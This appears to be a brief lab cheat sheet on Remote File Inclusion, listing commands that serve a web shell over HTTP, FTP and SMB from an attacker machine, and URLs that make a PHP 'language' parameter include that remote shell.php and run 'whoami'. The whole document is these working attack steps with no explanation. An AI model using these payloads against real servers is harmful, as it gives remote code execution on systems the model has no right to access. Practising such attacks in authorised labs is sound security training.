# Remote File Inclusion

## HTTP

```shell
my@attack:~$ python3 -m http.server 8888
```

```shell
my@attack:~$ firefox "http://94.237.59.180:37581/index.php?language=http://10.10.14.229:8888/shell.php&cmd=whoami"
```

## FTP

```shell
my@attack:~$ sudo python3 -m pyftpdlib -p 21
```

```shell
my@attack:~$ firefox "http://94.237.59.180:37581/index.php?language=ftp://10.10.14.229:21/shell.php&cmd=whoami"
```

## SMB

```shell
my@attack:~$ sudo smbserver.py -smb2support share /tmp
```

```shell
my@attack:~$ firefox "http://94.237.59.180:37581/index.php?language=\\\\10.10.14.229\share\shell.php&cmd=whoami"
```
